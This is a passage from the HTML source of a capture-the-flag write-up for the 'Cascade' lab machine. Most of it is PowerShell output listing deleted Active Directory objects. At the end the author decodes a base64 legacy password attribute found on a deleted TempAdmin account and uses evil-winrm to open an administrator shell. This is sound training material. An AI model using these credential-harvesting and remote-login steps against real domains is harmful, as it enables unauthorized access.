                                  <span class="no">DEL</span><span class="ss">:ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span>
<span class="no">CN</span>                              <span class="p">:</span> <span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}</span>
                                  <span class="no">DEL</span><span class="ss">:ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span>
<span class="no">Created</span>                         <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">30</span> <span class="no">AM</span>
<span class="n">createTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">30</span> <span class="no">AM</span>
<span class="no">Deleted</span>                         <span class="p">:</span> <span class="no">True</span>
<span class="no">Description</span>                     <span class="p">:</span>
<span class="no">DisplayName</span>                     <span class="p">:</span> <span class="no">Block</span> <span class="no">Potato</span>
<span class="no">DistinguishedName</span>               <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}\</span><span class="mi">0</span><span class="no">ADEL</span><span class="ss">:ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">dSCorePropagationData</span>           <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">1601</span> <span class="mi">12</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span> <span class="no">AM</span><span class="p">}</span>
<span class="n">flags</span>                           <span class="p">:</span> <span class="mi">0</span>
<span class="n">gPCFileSysPath</span>                  <span class="p">:</span> <span class="p">\\</span><span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="p">\</span><span class="no">SysVol</span><span class="p">\</span><span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="p">\</span><span class="no">Policies</span><span class="p">\{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}</span>
<span class="n">gPCFunctionalityVersion</span>         <span class="p">:</span> <span class="mi">2</span>
<span class="n">gPCMachineExtensionNames</span>        <span class="p">:</span> <span class="p">[{</span><span class="mi">35378</span><span class="no">EAC</span><span class="o">-</span><span class="mi">683</span><span class="no">F</span><span class="o">-</span><span class="mi">11</span><span class="no">D2</span><span class="o">-</span><span class="no">A89A</span><span class="o">-</span><span class="mo">00</span><span class="no">C04FBBCFA2</span><span class="p">}{</span><span class="mi">53</span><span class="no">D6AB1D</span><span class="o">-</span><span class="mi">2488</span><span class="o">-</span><span class="mi">11</span><span class="no">D1</span><span class="o">-</span><span class="no">A28C</span><span class="o">-</span><span class="mo">00</span><span class="no">C04FB94F17</span><span class="p">}][{</span><span class="no">B1BE8D72</span><span class="o">-</span><span class="mi">6</span><span class="no">EAC</span><span class="o">-</span><span class="mi">11</span><span class="no">D2</span><span class="o">-</span><span class="no">A4EA</span><span class="o">-</span><span class="mo">00</span><span class="no">C04F79F83A</span><span class="p">}{</span><span class="mi">53</span><span class="no">D6AB1D</span><span class="o">-</span><span class="mi">2488</span><span class="o">-</span><span class="mi">11</span><span class="no">D1</span><span class="o">-</span><span class="no">A28C</span><span class="o">-</span><span class="mo">00</span><span class="no">C04FB94F17</span><span class="p">}]</span>
<span class="n">instanceType</span>                    <span class="p">:</span> <span class="mi">4</span>
<span class="n">isDeleted</span>                       <span class="p">:</span> <span class="no">True</span>
<span class="no">LastKnownParent</span>                 <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">Policies</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">System</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="no">Modified</span>                        <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">modifyTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">msDS</span><span class="o">-</span><span class="no">LastKnownRDN</span>               <span class="p">:</span> <span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}</span>
<span class="no">Name</span>                            <span class="p">:</span> <span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}</span>
                                  <span class="no">DEL</span><span class="ss">:ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span>
<span class="n">nTSecurityDescriptor</span>            <span class="p">:</span> <span class="no">System</span><span class="o">.</span><span class="no">DirectoryServices</span><span class="o">.</span><span class="no">ActiveDirectorySecurity</span>
<span class="no">ObjectCategory</span>                  <span class="p">:</span>
<span class="no">ObjectClass</span>                     <span class="p">:</span> <span class="n">groupPolicyContainer</span>
<span class="no">ObjectGUID</span>                      <span class="p">:</span> <span class="n">ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span>
<span class="no">ProtectedFromAccidentalDeletion</span> <span class="p">:</span> <span class="no">False</span>
<span class="n">sDRightsEffective</span>               <span class="p">:</span> <span class="mi">0</span>
<span class="n">showInAdvancedViewOnly</span>          <span class="p">:</span> <span class="no">True</span>
<span class="n">uSNChanged</span>                      <span class="p">:</span> <span class="mi">196701</span>
<span class="n">uSNCreated</span>                      <span class="p">:</span> <span class="mi">196688</span>
<span class="n">versionNumber</span>                   <span class="p">:</span> <span class="mi">2</span>
<span class="n">whenChanged</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">whenCreated</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">30</span> <span class="no">AM</span>

<span class="no">CanonicalName</span>                   <span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="o">/</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="o">/</span><span class="no">Machine</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">93</span><span class="n">c23674</span><span class="o">-</span><span class="n">e411</span><span class="o">-</span><span class="mi">400</span><span class="n">b</span><span class="o">-</span><span class="n">bb9f</span><span class="o">-</span><span class="n">c0340bda5a34</span>
<span class="no">CN</span>                              <span class="p">:</span> <span class="no">Machine</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">93</span><span class="n">c23674</span><span class="o">-</span><span class="n">e411</span><span class="o">-</span><span class="mi">400</span><span class="n">b</span><span class="o">-</span><span class="n">bb9f</span><span class="o">-</span><span class="n">c0340bda5a34</span>
<span class="no">Created</span>                         <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">31</span> <span class="no">AM</span>
<span class="n">createTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">31</span> <span class="no">AM</span>
<span class="no">Deleted</span>                         <span class="p">:</span> <span class="no">True</span>
<span class="no">Description</span>                     <span class="p">:</span>
<span class="no">DisplayName</span>                     <span class="p">:</span>
<span class="no">DistinguishedName</span>               <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">Machine</span><span class="p">\</span><span class="mi">0</span><span class="no">ADEL</span><span class="p">:</span><span class="mi">93</span><span class="n">c23674</span><span class="o">-</span><span class="n">e411</span><span class="o">-</span><span class="mi">400</span><span class="n">b</span><span class="o">-</span><span class="n">bb9f</span><span class="o">-</span><span class="n">c0340bda5a34</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">dSCorePropagationData</span>           <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">1601</span> <span class="mi">12</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span> <span class="no">AM</span><span class="p">}</span>
<span class="n">instanceType</span>                    <span class="p">:</span> <span class="mi">4</span>
<span class="n">isDeleted</span>                       <span class="p">:</span> <span class="no">True</span>
<span class="no">LastKnownParent</span>                 <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}\</span><span class="mi">0</span><span class="no">ADEL</span><span class="ss">:ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="no">Modified</span>                        <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">modifyTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">msDS</span><span class="o">-</span><span class="no">LastKnownRDN</span>               <span class="p">:</span> <span class="no">Machine</span>
<span class="no">Name</span>                            <span class="p">:</span> <span class="no">Machine</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">93</span><span class="n">c23674</span><span class="o">-</span><span class="n">e411</span><span class="o">-</span><span class="mi">400</span><span class="n">b</span><span class="o">-</span><span class="n">bb9f</span><span class="o">-</span><span class="n">c0340bda5a34</span>
<span class="n">nTSecurityDescriptor</span>            <span class="p">:</span> <span class="no">System</span><span class="o">.</span><span class="no">DirectoryServices</span><span class="o">.</span><span class="no">ActiveDirectorySecurity</span>
<span class="no">ObjectCategory</span>                  <span class="p">:</span>
<span class="no">ObjectClass</span>                     <span class="p">:</span> <span class="n">container</span>
<span class="no">ObjectGUID</span>                      <span class="p">:</span> <span class="mi">93</span><span class="n">c23674</span><span class="o">-</span><span class="n">e411</span><span class="o">-</span><span class="mi">400</span><span class="n">b</span><span class="o">-</span><span class="n">bb9f</span><span class="o">-</span><span class="n">c0340bda5a34</span>
<span class="no">ProtectedFromAccidentalDeletion</span> <span class="p">:</span> <span class="no">False</span>
<span class="n">sDRightsEffective</span>               <span class="p">:</span> <span class="mi">0</span>
<span class="n">showInAdvancedViewOnly</span>          <span class="p">:</span> <span class="no">True</span>
<span class="n">uSNChanged</span>                      <span class="p">:</span> <span class="mi">196699</span>
<span class="n">uSNCreated</span>                      <span class="p">:</span> <span class="mi">196689</span>
<span class="n">whenChanged</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">whenCreated</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">31</span> <span class="no">AM</span>

<span class="no">CanonicalName</span>                   <span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="o">/</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="o">/</span><span class="no">User</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">746385</span><span class="n">f2</span><span class="o">-</span><span class="n">e3a0</span><span class="o">-</span><span class="mi">4252</span><span class="o">-</span><span class="n">b83a</span><span class="o">-</span><span class="mi">5</span><span class="n">a206da0ed88</span>
<span class="no">CN</span>                              <span class="p">:</span> <span class="no">User</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">746385</span><span class="n">f2</span><span class="o">-</span><span class="n">e3a0</span><span class="o">-</span><span class="mi">4252</span><span class="o">-</span><span class="n">b83a</span><span class="o">-</span><span class="mi">5</span><span class="n">a206da0ed88</span>
<span class="no">Created</span>                         <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">31</span> <span class="no">AM</span>
<span class="n">createTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">31</span> <span class="no">AM</span>
<span class="no">Deleted</span>                         <span class="p">:</span> <span class="no">True</span>
<span class="no">Description</span>                     <span class="p">:</span>
<span class="no">DisplayName</span>                     <span class="p">:</span>
<span class="no">DistinguishedName</span>               <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">User</span><span class="p">\</span><span class="mi">0</span><span class="no">ADEL</span><span class="p">:</span><span class="mi">746385</span><span class="n">f2</span><span class="o">-</span><span class="n">e3a0</span><span class="o">-</span><span class="mi">4252</span><span class="o">-</span><span class="n">b83a</span><span class="o">-</span><span class="mi">5</span><span class="n">a206da0ed88</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">dSCorePropagationData</span>           <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">1601</span> <span class="mi">12</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span> <span class="no">AM</span><span class="p">}</span>
<span class="n">instanceType</span>                    <span class="p">:</span> <span class="mi">4</span>
<span class="n">isDeleted</span>                       <span class="p">:</span> <span class="no">True</span>
<span class="no">LastKnownParent</span>                 <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}\</span><span class="mi">0</span><span class="no">ADEL</span><span class="ss">:ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="no">Modified</span>                        <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">modifyTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">msDS</span><span class="o">-</span><span class="no">LastKnownRDN</span>               <span class="p">:</span> <span class="no">User</span>
<span class="no">Name</span>                            <span class="p">:</span> <span class="no">User</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">746385</span><span class="n">f2</span><span class="o">-</span><span class="n">e3a0</span><span class="o">-</span><span class="mi">4252</span><span class="o">-</span><span class="n">b83a</span><span class="o">-</span><span class="mi">5</span><span class="n">a206da0ed88</span>
<span class="n">nTSecurityDescriptor</span>            <span class="p">:</span> <span class="no">System</span><span class="o">.</span><span class="no">DirectoryServices</span><span class="o">.</span><span class="no">ActiveDirectorySecurity</span>
<span class="no">ObjectCategory</span>                  <span class="p">:</span>
<span class="no">ObjectClass</span>                     <span class="p">:</span> <span class="n">container</span>
<span class="no">ObjectGUID</span>                      <span class="p">:</span> <span class="mi">746385</span><span class="n">f2</span><span class="o">-</span><span class="n">e3a0</span><span class="o">-</span><span class="mi">4252</span><span class="o">-</span><span class="n">b83a</span><span class="o">-</span><span class="mi">5</span><span class="n">a206da0ed88</span>
<span class="no">ProtectedFromAccidentalDeletion</span> <span class="p">:</span> <span class="no">False</span>
<span class="n">sDRightsEffective</span>               <span class="p">:</span> <span class="mi">0</span>
<span class="n">showInAdvancedViewOnly</span>          <span class="p">:</span> <span class="no">True</span>
<span class="n">uSNChanged</span>                      <span class="p">:</span> <span class="mi">196700</span>
<span class="n">uSNCreated</span>                      <span class="p">:</span> <span class="mi">196690</span>
<span class="n">whenChanged</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">whenCreated</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">31</span> <span class="no">AM</span>

<span class="n">accountExpires</span>                  <span class="p">:</span> <span class="mi">9223372036854775807</span>
<span class="n">badPasswordTime</span>                 <span class="p">:</span> <span class="mi">0</span>
<span class="n">badPwdCount</span>                     <span class="p">:</span> <span class="mi">0</span>
<span class="no">CanonicalName</span>                   <span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="o">/</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="o">/</span><span class="no">TempAdmin</span>
                                  <span class="no">DEL</span><span class="ss">:f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span>
<span class="n">cascadeLegacyPwd</span>                <span class="p">:</span> <span class="no">YmFDVDNyMWFOMDBkbGVz</span>
<span class="no">CN</span>                              <span class="p">:</span> <span class="no">TempAdmin</span>
                                  <span class="no">DEL</span><span class="ss">:f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span>
<span class="n">codePage</span>                        <span class="p">:</span> <span class="mi">0</span>
<span class="n">countryCode</span>                     <span class="p">:</span> <span class="mi">0</span>
<span class="no">Created</span>                         <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">08</span> <span class="no">AM</span>
<span class="n">createTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">08</span> <span class="no">AM</span>
<span class="no">Deleted</span>                         <span class="p">:</span> <span class="no">True</span>
<span class="no">Description</span>                     <span class="p">:</span>
<span class="no">DisplayName</span>                     <span class="p">:</span> <span class="no">TempAdmin</span>
<span class="no">DistinguishedName</span>               <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">TempAdmin</span><span class="p">\</span><span class="mi">0</span><span class="no">ADEL</span><span class="ss">:f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">dSCorePropagationData</span>           <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">08</span> <span class="no">AM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">1601</span> <span class="mi">12</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span> <span class="no">AM</span><span class="p">}</span>
<span class="n">givenName</span>                       <span class="p">:</span> <span class="no">TempAdmin</span>
<span class="n">instanceType</span>                    <span class="p">:</span> <span class="mi">4</span>
<span class="n">isDeleted</span>                       <span class="p">:</span> <span class="no">True</span>
<span class="no">LastKnownParent</span>                 <span class="p">:</span> <span class="no">OU</span><span class="o">=</span><span class="no">Users</span><span class="p">,</span><span class="no">OU</span><span class="o">=</span><span class="no">UK</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">lastLogoff</span>                      <span class="p">:</span> <span class="mi">0</span>
<span class="n">lastLogon</span>                       <span class="p">:</span> <span class="mi">0</span>
<span class="n">logonCount</span>                      <span class="p">:</span> <span class="mi">0</span>
<span class="no">Modified</span>                        <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">34</span> <span class="no">AM</span>
<span class="n">modifyTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">34</span> <span class="no">AM</span>
<span class="n">msDS</span><span class="o">-</span><span class="no">LastKnownRDN</span>               <span class="p">:</span> <span class="no">TempAdmin</span>
<span class="no">Name</span>                            <span class="p">:</span> <span class="no">TempAdmin</span>
                                  <span class="no">DEL</span><span class="ss">:f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span>
<span class="n">nTSecurityDescriptor</span>            <span class="p">:</span> <span class="no">System</span><span class="o">.</span><span class="no">DirectoryServices</span><span class="o">.</span><span class="no">ActiveDirectorySecurity</span>
<span class="no">ObjectCategory</span>                  <span class="p">:</span>
<span class="no">ObjectClass</span>                     <span class="p">:</span> <span class="n">user</span>
<span class="no">ObjectGUID</span>                      <span class="p">:</span> <span class="n">f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span>
<span class="n">objectSid</span>                       <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3332504370</span><span class="o">-</span><span class="mi">1206983947</span><span class="o">-</span><span class="mi">1165150453</span><span class="o">-</span><span class="mi">1136</span>
<span class="n">primaryGroupID</span>                  <span class="p">:</span> <span class="mi">513</span>
<span class="no">ProtectedFromAccidentalDeletion</span> <span class="p">:</span> <span class="no">False</span>
<span class="n">pwdLastSet</span>                      <span class="p">:</span> <span class="mi">132245689883479503</span>
<span class="n">sAMAccountName</span>                  <span class="p">:</span> <span class="no">TempAdmin</span>
<span class="n">sDRightsEffective</span>               <span class="p">:</span> <span class="mi">0</span>
<span class="n">userAccountControl</span>              <span class="p">:</span> <span class="mi">66048</span>
<span class="n">userPrincipalName</span>               <span class="p">:</span> <span class="no">TempAdmin</span><span class="vi">@cascade</span><span class="p">.</span><span class="nf">local</span>
<span class="n">uSNChanged</span>                      <span class="p">:</span> <span class="mi">237705</span>
<span class="n">uSNCreated</span>                      <span class="p">:</span> <span class="mi">237695</span>
<span class="n">whenChanged</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">34</span> <span class="no">AM</span>
<span class="n">whenCreated</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">08</span> <span class="no">AM</span>
</code></pre></div></div>
<hr />

<p>Found the <code class="language-plaintext highlighter-rouge">cascadeLegacyPwd</code> of <code class="language-plaintext highlighter-rouge">Tempadmin</code></p>

<p><code class="language-plaintext highlighter-rouge">cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz</code></p>

<hr />

<h3 id="time-to-decode">Time to decode..</h3>

<p><code class="language-plaintext highlighter-rouge">echo YmFDVDNyMWFOMDBkbGVz|base64 -d </code>
<code class="language-plaintext highlighter-rouge">baCT3r1aN00dles</code>
—</p>

<h2 id="logging-as-admin">Logging as ADMIN</h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="nb">p</span> <span class="n">baCT3r1aN00dles</span>

<span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span> <span class="n">shell</span> <span class="n">v2</span><span class="o">.</span><span class="mi">0</span>

<span class="no">Info</span><span class="p">:</span> <span class="no">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>

<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrator</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span>
</code></pre></div></div>

<h2 id="getting-roottxt">Getting Root.txt</h2>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrator</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="o">..</span>
